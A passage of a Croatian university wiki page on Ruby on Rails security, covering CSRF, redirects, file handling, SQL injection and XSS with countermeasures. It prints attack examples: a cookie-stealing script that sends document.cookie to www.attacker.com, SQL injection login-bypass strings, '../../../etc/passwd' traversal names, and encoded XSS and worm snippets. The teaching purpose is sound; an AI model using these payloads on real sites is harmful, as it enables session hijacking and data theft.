+</p><p>Ruby on Rails sadrži vrlo jednostavan način za obranu od CSRF vrste napada, budući da posjeduje metodu koja će automatski uključiti sigurnosni token u sve forme i sve AJAX zahtjeve koje Rails generira. U slučaju da se token ne podudara s očekivanim, bit će izbačen Exception. Za implementaciju je unutar controllera aplikacije potrebno dodati iduće:
+</p>
+<pre>protect_from_forgery with:&#160;:exception</pre>
+<p>Na slici je prikazan primjer kako izgleda forma nakon postavljanja navedene metode.
+</p><p><a href="http://security.foi.hr/wiki/index.php/Datoteka:Form-token.PNG" class="image"><img alt="Token unutar forme" src="../images/4/4f/Form-token.PNG" width="713" height="83" /></a>
+</p><p>Treba uzeti u obzir da XSS ranjivosti prelaze sve CSRF zaštite jer XSS daje mogućnost napadaču da dođe to svih elemenata na stranici, putem Javascript koda može manipulirati DOM elementima te tako doći do tokena koji koristimo za zaštitu od CSRF napada, a također nakon toga može i sam izvesti izvršavanje forme koju je sam dinamički kreirao.
+</p>
+<h2> <span class="mw-headline" id="Preusmjeravanje_i_dokumenti"> Preusmjeravanje i dokumenti </span></h2>
+<h3> <span class="mw-headline" id="Preusmjeravanje"> Preusmjeravanje </span></h3>
+<p>Kada je korisniku dozvoljeno proslijediti dijelove URL-a za preusmjeravanje, moguće su ranjivosti. Najočitiji takav napad je preusmjeravanje na lažne stranice koje izgledaju jednako kao originalna stranica te neoprezni korisnici neće uočiti razliku, takvi napadi često se još nazivaju i <i>phishing</i>. Na ovaj način napadači šalju poveznice koje na prvi pogled ne izgledaju sumnjivo, budući da započinju sa pravom adresom i domenom, međutim opasan dio šalju u parametru za preusmjeravanje, kao na idućem primjeru:
+</p>
+<pre>http://www.example.com/site/redirect?to= www.attacker.com</pre>
+<p>Za zaštitu treba koristiti <i>whitelist</i> pristup koji će definirati koje je parametre moguće koristiti kod preusmjeravanja, a sve ostale zabraniti. Također se ne treba dozvoliti upisivanje URL-a ili njegovih dijelova prilikom preusmjeravanja nego samo parametre onih odredišta na koja želimo dozvoliti preusmjeravanje.
+</p><p><br />
+</p>
+<h3> <span class="mw-headline" id="Upload_datoteka"> Upload datoteka </span></h3>
+<p>Brojne aplikacije dopuštaju korisnicima da uploadaju datoteke i tada je bitno očistiti nazive datoteka budući da napadač na taj način može koristiti štetno ime dokumenta kako bi obrisao neki dokument s poslužitelja. Ako se datoteke spremaju na lokaciji <b>/var/www/uploads</b>, a korisnik kao naziv upiše "<b>../../../etc/passwd</b>" moguće je da obriše bitne datoteke. Iz tog razloga je dobro pokretati Unix poslužitelj kao korisnik s manjim ovlastima, kako bi se ovakvi napadi spriječili.
+</p><p>Kod filtriranja naziva datoteka koje korisnici uploadaju, u situacijama kada naziv ima nedozvoljeni sadržaj, ne treba samo čistiti taj sadržaj od malicioznih dijelova nego korištenjem <i>whitelist</i> pristupa odrediti kakvi su nazivi dokumenata dozvoljeni, a ostale zabraniti. U nastavku je prikazan kod plugina pod nazivom <a href="https://github.com/technoweenie/attachment_fu/tree/master" class="external text" rel="nofollow"><b>attachment_fu</b></a> te način na koji on provjerava i mijenja nazive datoteka.
+</p>
+<pre>
+def sanitize_filename(filename)
+  filename.strip.tap do |name|
+    # NOTE: File.basename doesn't work right with Windows paths on Unix
+    # get only the filename, not the whole path
+    name.sub! /\A.*(\\|\/)/, ''
+    # Finally, replace all non alphanumeric, underscore
+    # or periods with underscore
+    name.gsub! /[^\w\.\-]/, '_'
+  end
+end
+</pre>
+<p>Još jedan od prijedloga za upravljanje uploadom datoteka je korištenje asinkronog načina kako bi se izbjegli <b>Denial-of-service (DoS)</b> napadi prilikom kojih napadač sinkronizirano uspostavi upload datoteka s velikog broja računala u isto vrijeme te time izazove manju reponzivnost poslužitelja, a eventualno ga može i srušiti. Asinkroni način omogućuje da se spremi datoteka koju je potrebno uploadati, a zatim se šalje zahtjev poslužitelju da započne s preuzimanjem dokumenta u pozadini.
+</p>
+<h3> <span class="mw-headline" id="Preuzimanje_dokumenata"> Preuzimanje dokumenata </span></h3>
+<p>Kao i kod uploada dokumenata od strane korisnika, potrebno je raditi filtraciju naziva datoteka i prilikom korisnikovog preuzimanja dokumenta. <code>send_file()</code> metoda šalje dokument od poslužitelja prema klijentu. Ukoliko se koristi naziv datoteke koje je naveo korisnik bez provjere upisanog sadržaja, moguće je preuzeti bilo koji dokument, kao u primjeru:
+</p>
+<pre>send_file('/var/www/uploads/' + params[:filename])</pre>
+<p>U slučaju da se proslijedi naziv <b>"../../../etc/passwd"</b> moguće je preuzeti datoteku s korisničkim podacima za prijavu.
+</p>
+<h2> <span class="mw-headline" id="Sigurnost_administracijskog_su.C4.8Delja"> Sigurnost administracijskog sučelja </span></h2>
+<p>Administracijska sučelja česta su i glavna meta napada u web aplikacijama, zbog velikih razina dozvola koje administratori imaju. Zbog toga je bitno uvesti role koje će odrediti dopuštenja koje korisnik ima u sustavu. 
+</p><p>Najveće prijetnje administracijskih sučelja često su vezana uz korisnički upis iz vanjskog dijela aplikacije, neki od takvih podataka su korisnički podaci kao što su imena, komentari, adrese i slično. Kada se takvi podaci pokazuju kod korisnika vrlo je bitno da svi upisi budu očišćeni, kako bi se izbjegli XSS napadi. U slučaju da postoji samo jedno mjesto unutar aplikacije u kojem se prikazuju podaci u izvornom obliku, bez provjere, moguća je opasnost za cijeli sustav.
+</p><p>Česti su i CSRF napadi koji omogućuju korisniku da obavlja sve akcije za koje administrator ima ovlasti. Kod ovakvog napada napadač mora znati strukturu URL-a, međutim kod Rails aplikacija je ta struktura prilično slična kod raznih aplikacija pa je moguće doći do sretnog pogotka nakon korištenja određenog broja kombinacija.
+</p><p>Administracijsko sučelje često je locirano na adresi kao što je <code>www.example.com/admin</code> te ga je napadaču lako pogoditi. Tom području se obično ne može pristupiti ukoliko nije obavljena prijava, kao što je to u slučaju naše aplikacije:
+</p>
+<pre>before_action&#160;:confirm_logged_in</pre>
+<p>Međutim, to nije dovoljna zaštita budući da napadač zaista može imati administratorove podatke za prijavu. Neke od mogućih rješenja su dozvola pristupa administracijskom pristupu samo s određenog skupa IP adresa. 
+</p><p>Moguće je također administracijsko sučelje postaviti na zasebnu poddomenu, npr. admin.simplecms.com i odvojiti tu aplikaciju i njezino upravljanje korisnicima. Na taj način nije moguće ukrasti administratorov kolačić s domene www.simplecms.com, jer mora vrijediti pravilo zajedničkog podrijetla u pregledniku: (XSS) skripta na adresi www.application.com ne može čitati kolačić od admin.application.com, isto vrijedi i za suprotan smjer.
+</p><p>--<a href="http://security.foi.hr/wiki/index.php?title=Suradnik:Ivan.milicevic&amp;action=edit&amp;redlink=1" class="new" title="Suradnik:Ivan.milicevic (stranica ne postoji)">Ivan Miličević</a> 18:30, 21. siječnja 2016. (CET)
+</p>
+<h2> <span class="mw-headline" id="Upravljanje_Korisnicima"> Upravljanje Korisnicima </span></h2>
+<p>„User management“ je servis koji omogućuje kreiranje i upravljanje korisničkim podacima svakog korisnika sustava. Moguće je pregledavati koliko je aktivnih korisnika, manualno odlogirati korisnike, ograničiti vrijeme korištenja sustava itd.
+Skoro svaka web aplikacija mora se nositi s autentifikacijom i autorizacijom. Umjesto da se to radi samostalno, preporučuje se korištenje pluginova koji imaju već ugrađene algoritme. Najbitnije ih je održavati ažurnima radi što veće sigurnosti. Mnoštvo je autentifikacijskih pluginova za Rails raspoloživo. Neki od boljih su <a href="https://github.com/plataformatec/devise" class="external text" rel="nofollow"><b>devise</b></a>  i <a href="https://github.com/binarylogic/authlogic" class="external text" rel="nofollow"><b>authlogic</b></a>  i spremaju samo kriptirane lozinke. Rails 3.1. daje mogućnost korištenja ugrađene <code>has_secure_password</code> metode koja ima slične značajke kao i navedeni dodaci.
+</p>
+<h3> <span class="mw-headline" id="Brute-Forcing_Ra.C4.8Duni"> Brute-Forcing Računi </span></h3>
+<p>„Brute force“ napadi se izvršavaju tako da napadač pokušava provaliti korisničke lozinke i pokušava sve dok ne uspije. Obično se izvršava pomoću software-a koji generira velik broj pokušaja. Većina  ljudi ima kratke lozinke koje sadrže kombinaciju slova, brojeva i ponekog specijalnog znaka. Takve lozinke računalo može provaliti za nekoliko minuta ili sati. Preporučuje se korištenje passfraza od 20 ili više znakova. Preporučuje se generiranje error poruka poput ove: „user name or password not correct“. Kada bi se reklo da npr. Lozinka nije točna tada bi bilo lagano samo generirati lozinke i brzo bi se provalio račun. Ono što se preporučuje je upotreba CAPTCHE nakon nekoliko neuspjelih pokušaja s određene IP adresa. Iako ni to nije najsigurnije rješenje jer računala mogu mijenjati IP adrese.
+</p>
+<h3> <span class="mw-headline" id="Kra.C4.91a_Ra.C4.8Duna"> Krađa Računa </span></h3>
+<h4> <span class="mw-headline" id="Lozinke"> Lozinke </span></h4>
+<p><b>Situacija</b>: Napadač može ukrasti sesiju i koristiti aplikaciju umjesto korisnika. Tada je lako promijeniti lozinku u postavkama za par minuta. Postoji i mogućnost da je forma za promjenu lozinke ranjiva na CSRF pa napadač može namamiti korisnika na npr. IMG file unutar kojeg se nalazi lažni URL koji mijenja lozinku po njegovoj želji.<br />
+<b>Rješenje</b>: Napraviti login forme ili forme za promjenu lozinke sigurne protiv CSRF napada i tražiti unos stare lozinke pri promjeni.
+</p>
+<h4> <span class="mw-headline" id="E-Mail"> E-Mail </span></h4>
+<p><b>Situacija</b>: Dok je napadač ukrao sesiju moguće je isto tako i promijeniti email. Kad ga promijeni može otići na „forgot password“ stranicu i nova lozinka će biti poslana na njegovu email adresu koju je unio.<br />
+<b>Rješenje</b>: Tražiti da se unese lozinka pri promjeni email-a.
+</p>
+<h4> <span class="mw-headline" id="Drugo"> Drugo </span></h4>
+<p><b>Situacija</b>: Pomoću CSRF ranjivosti se može provaliti u Google mail. Recimo da je korisnik prijavljen s Google računom. Napadač navodi korisnika na web stranicu koju on kontrolira. Na njoj se nalazi IMG tag unutar nečega i klikom na tag pomoću GET HTTP zahtjeva se promijene filteri Gmail-a. Napadač može promijeniti filtere tako da preusmjeri mailove na svoju adresu.<br />
+<b>Rješenje</b>: Pregledati i ispitati aplikaciju i eliminirati sve XSS i CSRF ranjivosti.
+</p>
+<h3> <span class="mw-headline" id="CAPTCHA"> CAPTCHA </span></h3>
+<p>CAPTCHA je test koji raspoznaje da odgovor nije došao od računala. Obično se koristi kod formi za komentiranje kako ne bi nastao veliki broj neželjenih poruka ili kod kreiranja računa.
+Najpopularniji CAPTCHA test je <a href="https://www.google.com/recaptcha/intro/index.html" class="external text" rel="nofollow"><b>reCAPTCHA</b></a> . Sadrži dvije izobličene slike riječi iz starih knjiga. Uz to je dodana i linija koja prolazi duž tih riječi.
+</p><p><a href="http://security.foi.hr/wiki/index.php/Datoteka:Recaptcha-example.gif" class="image"><img alt="Recaptcha-example.gif" src="../images/0/01/Recaptcha-example.gif" width="314" height="125" /></a>
+</p><p>ReCAPTCHA isto tako postoji i kao <a href="https://github.com/ambethia/recaptcha/" class="external text" rel="nofollow"><b>Rails reCAPTCHA</b></a>.  Javni i privatni ključ se dobiju s API-ja i moraju se ubaciti u Rails okruženje. Nakon toga se može unutar „View“-a koristiti „recaptha_tags“  i „verify recaptcha“ unutar kontrolera.„Verify recaptcha“ će vratiti „false“ ukoliko verifikacija ne prođe.
+Negativna CAPTCHA ne služi da bi korisnik dokazao da je čovjek, već da bi se otkrio spam robot. Većina robota je glupa i samo puzaju Webom i stavljaju neželjene poruke unutar svake forme koju nađu. Pomoću negativna CAPTCHE se to može iskoristi tako da se umetne „honeypot“ polje unutar forme koje će biti nevidljivo korisniku koristeći CSS ili JavaScript.
+Neki od načina kako sakriti „honeypot“ polje:
+</p>
+<ul>
+<li>Pozicionirati polje izvan vidljivog dijela stranice</li>
+<li>Napraviti ga vrlo malim ili ga obojiti jednako kao i pozadinu</li>
+<li>Prikazati polje prikazano ali reći korisniku da ga ostavi prazno</li>
+</ul>
+<p>Na serveru se provjeri vrijednost polja i ako sadrži tekst mora biti robot. Tada se može ili ignorirati upit ili vratiti pozitivni rezultat, ali ne spremiti vrijednost u bazu.
+</p>
+<h3> <span class="mw-headline" id="Prijava_.28logging.29"> Prijava (logging) </span></h3>
+<p>„Tell Rails not to put passwords in the log files.“<br />
+Po zadanome, Rails bilježi sve zahtjeve koji su napravljeni prema web aplikaciji. Log dokumenti mogu biti veliki sigurnosni problem ukoliko sadrže korisničke podatke za prijavu, brojeve kreditnih kartica itd. Kod dizajniranja sigurnosnog koncepta web aplikacije, treba misliti o tome što se može dogoditi ako napadač dobije puni pristup web serveru. Kriptiranje podataka je tada beskorisno ako log datoteka izlista podatke u čistom tekstu. Ipak se mogu filtrirati neki parametri unutar log datoteka dodajući ih u <code>config.filter_parameters</code>. Ti parametri će biti označeni kao [FILTERED] u log datoteci. 
+</p>
+<pre>config.filter_parameters &lt;&lt;&#160;:password</pre>
+<h3> <span class="mw-headline" id="Regularni_izrazi"> Regularni izrazi </span></h3>
+<p>Česta zamka kod korištenja regularnih izraza u Ruby jeziku je da se početak i kraj stringa označava s „^“ i „$“, umjesto s /A i \z. Ruby koristi malo drukčiji pristup za označavanje početka i kraja stringa od drugih programskih jezika. <br />
+<b>Kako to može biti sigurnosni pristup?</b> <br />
+Recimo da želimo validirati URL polje i koristimo sljedeći regularni izraz: 
+<code>/^https?:\/\/[^\n]+$/i</code>
+U Ruby-u znakovi „^“ i „$“ označavaju početak i kraj reda. Zbog toga ovakav URL bi prošao takav filter:
+</p>
+<pre>javascript:exploit_code();/*
+http://hi.com
+*/</pre>
+<p>Takav URL će proći filter jer se regularni izraz odnosi samo na drugu liniju, ostalo ne gleda. Kako bi se popravio regularni izraz treba koristiti „\A“ i „\z“ i onda izgleda ovako:
+<code>/\Ahttps?:\/\/[^\n]+\z/i</code>
+</p><p>Primjer korištenja EMAIL_REGEXA u našoj aplikaciji:
+</p>
+<pre>
+EMAIL_REGEX = /\A[a-z0-9._%+-]+@[a-z0-9.-]+\.[a-z]{2,4}\Z/i
+</pre>
+<pre>
+validates&#160;:email,&#160;:presence =&gt; true,
+                   &#160;:length =&gt; {&#160;:maximum =&gt; 100 },
+                   &#160;:format =&gt; EMAIL_REGEX,
+                   &#160;:confirmation =&gt; true
+</pre>
+<h3> <span class="mw-headline" id="Eskalacija_Privilegija_.28Privilege_Escalation.29"> Eskalacija Privilegija (Privilege Escalation) </span></h3>
+<p>Najčešći parametar koji korisnik može neovlašteno mijenjati je ID parametar kao npr. u <code><a href="http://www.domain.com/project/1" class="external free" rel="nofollow">http://www.domain.com/project/1</a></code>
+gdje je id=1. To je uglavnom implementirano ovako:
+</p>
+<pre>@project = Project.find(params[:id])</pre>
+<p>U aplikacijama u kojima svaki korisnik ima jednak pristup podacima je to u redu, ali gdje to nije tako je sigurnosni problem. U tom slučaju bi se trebala raditi autentifikacija pri svakom mijenjaju ID-a:
+</p>
+<pre>@project = @current_user.projects.find(params[:id])</pre>
+<h2> <span class="mw-headline" id="Injection"> Injection </span></h2>
+<p>Injection je vrsta napada kod kojeg se umeće maliciozni kod ili parametri unutar web aplikacije. Istaknuti primjeri su cross-site scripting (XSS) i SQL injection.
+</p>
+<h3> <span class="mw-headline" id="Whitelists_protiv_Blacklists"> Whitelists protiv Blacklists </span></h3>
+<p>„When sanitizing, protecting or verifying something, prefer whitelists over blacklists.“<br />
+Crna lista može biti lista loših mailova, loših HTML tagova..., a „whitelist“ može biti lista dobrih mailova, dobrih HTML tagova itd. Iako je ponekad nemoguće upotrijebiti „whitelist“ preporučuje se upotreba whiteliste. „Whitelist“ je dobar pristup nasuprot ljudskom faktoru da zaboravi nešto unutar crne liste.
+</p>
+<h3> <span class="mw-headline" id="SQL_injection"> SQL injection </span></h3>
+<h4> <span class="mw-headline" id="Uvod_2"> Uvod </span></h4>
+<p>SQL injection napadi utječu na upite u baze podataka manipulirajući parametre web aplikacija. Najčešći cilj SQL injection napada je zaobilaženje autorizacije. Drugi cilj je izvršiti manipulaciju podataka ili čitanje proizvoljnih podataka. Slijedi primjer kako ne koristiti input podatke u upitu:
+</p>
+<pre>Project.where(&quot;name = '#{params[:name]}'&quot;)</pre>
+<p>Recimo da se radi o search elementu u korisnik upisuje ime projekta koji ga zanima. Ako je napadač u pitanju i ako upiše <code>' OR 1 --</code>, upit u bazu će izgledati ovako:
+</p>
+<pre>SELECT * FROM projects WHERE name = '' OR 1 --'</pre>
+<p>Dvije crtice započinju komentar ignorirajući sve poslije. Ovakav upit vraća sve podatke iz tablice „projects“ jer je stanje istinito.
+</p>
+<h4> <span class="mw-headline" id="Zaobila.C5.BEenje_Autorizacije"> Zaobilaženje Autorizacije </span></h4>
+<p>Obično korisnik upiše svoje korisničke podatke i web aplikacija pokušava naći podatke koji se podudaraju unutar baze podataka te dodjeljuje pristup ukoliko ih nađe. Međutim, napadač može zaobići takvu provjeru koristeći SQL injection. Slijedi tipičan primjer upita u Rails-u kako pronaći zapis iz baze koj ise podudara s unesenim podacima:
+</p>
+<pre>User.first(&quot;login = '#{params[:name]}' AND password = '#{params[:password]}'&quot;)</pre>
+<p>Ako napadač unese <code>' OR '1'='1</code> u polje „name“ i <code>' OR '2'&gt;'1</code> u polje „password“, upit će izgledati ovako:
+</p>
+<pre>SELECT * FROM users WHERE login = '' OR '1'='1' AND password = '' OR '2'&gt;'1' LIMIT 1</pre>
+<p>Takav upit će pronaći prvi zapis u bazi podataka i dati pristup korinsiku.
+</p>
+<h4> <span class="mw-headline" id="Protumjere"> Protumjere </span></h4>
+<p>Ruby on Rails ima ugrađeni filter za specijalne SQL znakove koji ispušta ', “, NULL znakove i prijelome redaka. Koristeći <code>Model.find(id) or Model.find_by_some thing(something)</code> protumjera se automatski primjenjuje. U SQL fragmentima, kao u uvjetnim fragmentima <code>(where("...")),connection.execute() ili Model.find_by_sql()</code> metodama, mora se ručno primijeniti.
+</p>
+<h3> <span class="mw-headline" id="Cross-Site_Scripting_.28XSS.29"> Cross-Site Scripting (XSS) </span></h3>
+<p>Najrasprostranjeniji, i jedan od najrazornijih sigurnosnih propusta web aplikacija je XSS. Ovaj maliciozni napad umeće izvediv kod. Rails pruža metode koje pomažu u obrani od ovog napada.
+</p>
+<h4> <span class="mw-headline" id="Ulazne_To.C4.8Dke"> Ulazne Točke </span></h4>
+<p>Ulazna točka je ranjivi URL i njegovi parametri gdje napadač može započeti napad.
+Najčešće ulazne točke su sva ona mjesta gdje korisnik može unijeti podatke. Ali napad ne mora doći samo iz input polja već može biti unutar svakog URL-a – očit ili skriven.
+XSS napad redi na sljedeći način: Napadač umetne neki kod, web aplikacija ga spremi i prikaže na stranici te ga tek kasnije prikaže žrtvi, obično u obliku „alert box“-a. XSS može ukrasti kolačiće, oteti sesiju, preusmjeriti žrtvu na lažnu web stranicu, prikazati reklame koje idu u korist napadača ili instalirati maliciozni software kroz sigurnosne rupe web preglednika.
+</p>
+<h4> <span class="mw-headline" id="HTML.2FJavaScript_Injection"> HTML/JavaScript Injection </span></h4>
+<p>Najčešći XSS programski jezik je JavaScript, često u kombinaciji s HTML-om. 
+Jednostavan način za provjeriti ranjivost na XSS je:
+</p>
+<pre>&lt;script&gt;alert('Hello');&lt;/script&gt;</pre>
+<h5> <span class="mw-headline" id="Kra.C4.91a_Kola.C4.8Di.C4.87a"> Krađa Kolačića </span></h5>
+<p>Krađa kolačića ne radi štetu direktno, već omogućuje napadaču da napravi štetu ako hoće.  Koristi se JavaScript svojstvo <code>document.cookie</code> kako bi se čitao i pisao kolačić. <code>document.cookie</code> sadrži kolačić od web servera. Međutim, taj kolačić se može čitati i pisati ako se ubaci unutar HTML elementa (kao što se događa kod XSS-a).  Primjer:
+</p>
+<pre>&lt;script&gt;document.write(document.cookie);&lt;/script&gt;</pre>
+<p>Za napadača to nije korisno jer će žrtva vidjeti svoj kolačić. Sljedeći primjer će učitati sliku s URL-a <code><a href="http://www.attacker.com/" class="external free" rel="nofollow">http://www.attacker.com/</a></code> plus kolačić. Taj URL ne postoji pa preglednik neće ništa prikazati, ali napadač može pregledati pristupne log datoteke kako bi vidio žrtvin kolačić.
+</p>
+<pre>&lt;script&gt;document.write('&lt;img src=&quot;http://www.attacker.com/' + document.cookie + '&quot;&gt;');&lt;/script&gt;</pre>
+<p>Log datoteke na <code>www.attacker.com</code> će pročitati kolačić.
+</p>
+<pre>GET http://www.attacker.com/_app_session=836c1c25278e5b321d6bea4f19cb57e2</pre>
+<p>Ovakvi napadi se mogu ublažiti dodavanjem <code>httpOnly</code> zastavice kolačiću kako <code>document.cookie</code> ne bi bio pročitan od JavaScripta-a. 
+</p>
+<h5> <span class="mw-headline" id="Protumjere_2"> Protumjere </span></h5>
+<p>Jako je bitno da se filtrira maliciozni input, ali isto tako je bitno i očistiti ispis web aplikacije . Specijalno za XSS, bitno je napraviti „whitelist“ ulaznih filtera umjesto crne liste. Crne liste nisu nikad kompletne. Zamislimo da crna lista briše <code>script</code> iz inputa. Napadač umetne <code>&lt;scrscriptipt&gt;</code>, i nakon filtera ostane <code>&lt;script&gt;</code>.
+Osim korištenja „whitelist“-e dobra je praksa očistiti sve izlaze aplikacije, posebno kod ponovnog prikazivanja inputa koji nije filtriran. Korištenjem <code>escapeHTML()</code>metode se znakovi &amp;, ", &lt;, &gt; zamjenjuju s HTML prikazima <code>(&amp;, &quot;, &lt;, and &gt;)</code>.
+</p><p>Primjer čišćenja zapisa i whitelistinga iz naše aplikacije:
+</p>
+<pre>
+raw(sanitize(section.content,&#160;:tags =&gt; ['strong', 'em', 'a']))
+</pre>
+<h5> <span class="mw-headline" id="Obfuscation_and_Encoding_Injection"> Obfuscation and Encoding Injection </span></h5>
+<p>Mrežni promet je većinom baziran na limitiranom latinskom alfabetu, nekoliko novih kodiranja, kao šro je Unicode. Isto tako to je i prijetnja web aplikacijama jer maliciozni kod može biti skriven u različitim kodiranjima koje web preglednik može obraditi, a web aplikacija možda ne može. Primjer napada u UTF-8 kodiranju:
+</p>
+<pre>&lt;IMG SRC=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;
+  &#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;&gt;</pre>
+<p>Ovaj kod će ipak biti prepoznat od strane <code>sanitize()</code> filtera. Odličan alat za kodiranje stringova je <a href="https://hackvertor.co.uk/public" class="external text" rel="nofollow"><b>Hackvertor</b></a>. Rails <code>sanitize()</code> metoda isto radi izvrstan posao u obrani od encoding napada.
+</p>
+<h4> <span class="mw-headline" id="Primjeri_iz_Prakse"> Primjeri iz Prakse </span></h4>
+<p>Kako bi se što bolje razumjeli današnji napadi na web aplikacije, najbolje je pogledati neke primjere iz stvarnog svijeta. Sljedeći kod je isječak iz Yahoo! Mail crva. Pojavio se 11.06.2006. i bio je prvi webmail crv.
+</p>
+<pre>&lt;img src='http://us.i1.yimg.com/us.yimg.com/i/us/nt/ma/ma_mail_1.gif'
+  target=&quot;&quot;onload=&quot;var http_request = false;    var Email = '';
+  var IDList = '';   var CRumb = '';   function makeRequest(url, Func, Method,Param) { ...</pre>
+<p>Crv je iskoristio sigurnosnu rupu u Yahoo-ovom HTML/JavaScript filteru koji obično filtrira sve <code>target</code> i <code>onload</code> atribute.
+</p>
+<h3> <span class="mw-headline" id="CSS_Injection"> CSS Injection </span></h3>
+<p>CSS injection je zapravo JavaScript injection jer neki preglednici (IE, neke verzije Safari-a i drugih) dopuštaju JavaScript u CSS-u. 
+CSS injection je najbolje objašnjen uz pomoć upotrebe poznatog MySpace Samy crva. Taj crv automatski šalje zahtjev za prijateljstvom Samiju (napadaču) posjetom njegovog profila. U nekoliko sati imao je preko milijun zahtjeva za prijateljstvom što je stvorilo previše prometa te se MySpace srušio.
+MySpace blokira puno tagova, međutim dopušta CSS tako da je Samy ubacio JavaScript unutar CSS-a.
+</p>
+<pre>&lt;div style=&quot;background:url('javascript:alert(1)')&quot;&gt;</pre>
+<p>Kako nisu dopušteni navodnici koristio je JavaScript <code>eval()</code> funkciju koja pokreče bilo kakav string kao kod.
+</p>
+<pre>&lt;div id=&quot;mycode&quot; expr=&quot;alert('hah!')&quot; style=&quot;background:url('javascript:eval(document.all.mycode.expr)')&quot;&gt;</pre>
+<p>Sljedeći problem je bio da je MySpace filtrirao riječ <code>javascript</code> pa je autor koristio <code>java&lt;NEWLINE&gt;script</code> kako bi to zaobišao:
+</p>
+<pre>&lt;div id=&quot;mycode&quot; expr=&quot;alert('hah!')&quot; style=&quot;background:url('java↵ script:eval(document.all.mycode.expr)')&quot;&gt;</pre>
+<p>Nadalje, problem je bio jer su korišteni CSRF sigurnosni tokeni. Bez njih nije mogao poslati zahtjev za prijateljstvom preko POST metode. Riješio je to slanjem GET zahtjeva prema stranici točno prije dodavanja korisnika i raščlanjivanja rezultata za CSRF token.
+Na kraju je dobio 4 KB velik crv, kojeg je umetnuo u svoju profilnu stranicu.
+</p>
+<h3> <span class="mw-headline" id="Ajax_Injection"> Ajax Injection </span></h3>
+<p>Iste sigurnosne mjere moraju biti poduzete za Ajax kao i za ostale injection napade. Međutim, postoji jedna iznimka, a ta je da ispis mora biti očišćen već u kontroleru ako akcija ne vrati „view“. 
+Ako se koristi <code>in_place_editor</code> plugin ili ako akcija vraća string, radije nego prikazivanje „view“-a mora se očistiti povratna vrijednost unutar akcije. Inače, ako povratna vrijednost sadrži XSS string, maliciozni kod će se pokrenuti nakon što se vrati u do preglednika. Čišćenje inputa se radi pomoću <code>h()</code> metode.
+</p><p><br />
+</p><p>--<a href="http://security.foi.hr/wiki/index.php?title=Suradnik:AndrejKas&amp;action=edit&amp;redlink=1" class="new" title="Suradnik:AndrejKas (stranica ne postoji)">Andrej Kasić</a> 02:50, 22. siječnja 2016. (CET)
+</p>
+<h2> <span class="mw-headline" id="Literatura"> Literatura </span></h2>
+<ol>
+<li>Ruby on Rails Guides: <a href="http://guides.rubyonrails.org/index.html" class="external free" rel="nofollow">http://guides.rubyonrails.org/index.html</a>, dostupno 21.1.2016.</li>
+<li>Ruby on Rails Security Guides: <a href="http://guides.rubyonrails.org/security.html" class="external free" rel="nofollow">http://guides.rubyonrails.org/security.html</a>, dostupno 21.1.2016. </li>
+<li>OWASP Top 10 2013: <a href="https://www.owasp.org/index.php/Top_10_2013" class="external free" rel="nofollow">https://www.owasp.org/index.php/Top_10_2013</a>, dostupno 21.1.2016.</li>
+<li>OWASP RUBY ON RAILS SECURITY GUIDE: <a href="https://www.owasp.org/images/8/89/Rails_Security_2.pdf" class="external free" rel="nofollow">https://www.owasp.org/images/8/89/Rails_Security_2.pdf</a></li>
+<li>How rails sessions work: <a href="http://www.justinweiss.com/articles/how-rails-sessions-work/" class="external free" rel="nofollow">http://www.justinweiss.com/articles/how-rails-sessions-work/</a>, dostupno 21.1.2016. </li>
+<li>Active Record Session Store: <a href="https://github.com/rails/activerecord-session_store" class="external free" rel="nofollow">https://github.com/rails/activerecord-session_store</a>, dostupno 21.1.2016.</li>
+<li>Ruby on Rails Cheet Sheet: <a href="https://www.owasp.org/index.php/Ruby_on_Rails_Cheatsheet#CSRF_.28Cross_Site_Request_Forgery.29" class="external free" rel="nofollow">https://www.owasp.org/index.php/Ruby_on_Rails_Cheatsheet#CSRF_.28Cross_Site_Request_Forgery.29</a>, dostupno 21.1.2016. </li>
+<li>Cross-site Scripting (XSS): <a href="https://www.owasp.org/index.php/Cross-site_Scripting_%28XSS%29" class="external free" rel="nofollow">https://www.owasp.org/index.php/Cross-site_Scripting_%28XSS%29</a> </li>
+</ol>
+
+<!-- 
+NewPP limit report
+Preprocessor node count: 469/1000000
+Post-expand include size: 0/2097152 bytes
+Template argument size: 0/2097152 bytes
+Expensive parser function count: 0/100
+-->
+
+<!-- Saved in parser cache with key sisds:pcache:idhash:8675-0!*!0!!hr!2!edit=0 and timestamp 20190203204222 -->
+<div class="printfooter">
+Dobavljeno iz "<a href="Sigurnosne_značajke_Ruby_on_Rails_web_aplikacija.html">http://security.foi.hr/wiki/index.php/Sigurnosne_zna%C4%8Dajke_Ruby_on_Rails_web_aplikacija</a>"</div>
+				<!-- /bodytext -->
+								<!-- catlinks -->
+				<div id='catlinks' class='catlinks catlinks-allhidden'></div>				<!-- /catlinks -->
+												<div class="visualClear"></div>
+			</div>
+			<!-- /bodyContent -->
+		</div>
+		<!-- /content -->
+		<!-- header -->
+		<div id="mw-head" class="noprint">
+			
+<!-- 0 -->
+<div id="p-personal" class="">
+	<h5>Osobni alati</h5>
+	<ul>
+					<li  id="pt-login"><a href="http://security.foi.hr/wiki/index.php?title=Posebno:Prijava&amp;returnto=Sigurnosne_zna%C4%8Dajke_Ruby_on_Rails_web_aplikacija" title="Predlažemo Vam da se prijavite, ali nije obvezno. [o]" accesskey="o">Prijavi se</a></li>
+			</ul>
+</div>
+
+<!-- /0 -->
+			<div id="left-navigation">
+				
+<!-- 0 -->
+<div id="p-namespaces" class="vectorTabs">
+	<h5>Imenski prostori</h5>
+	<ul>
+					<li  id="ca-nstab-main" class="selected"><span><a href="Sigurnosne_značajke_Ruby_on_Rails_web_aplikacija.html"  title="Pogledaj sadržaj [c]" accesskey="c">Članak</a></span></li>
+					<li  id="ca-talk" class="new"><span><a href="http://security.foi.hr/wiki/index.php?title=Razgovor:Sigurnosne_zna%C4%8Dajke_Ruby_on_Rails_web_aplikacija&amp;action=edit&amp;redlink=1"  title="Razgovor o stranici [t]" accesskey="t">Razgovor</a></span></li>
+			</ul>
+</div>
+
+<!-- /0 -->
+
+<!-- 1 -->
+<div id="p-variants" class="vectorMenu emptyPortlet">
+		<h5><span>Inačice</span><a href="Sigurnosne_značajke_Ruby_on_Rails_web_aplikacija.html#"></a></h5>
+	<div class="menu">
+		<ul>
+					</ul>
+	</div>
+</div>
+
+<!-- /1 -->
+			</div>
+			<div id="right-navigation">
+				
+<!-- 0 -->
+<div id="p-views" class="vectorTabs">
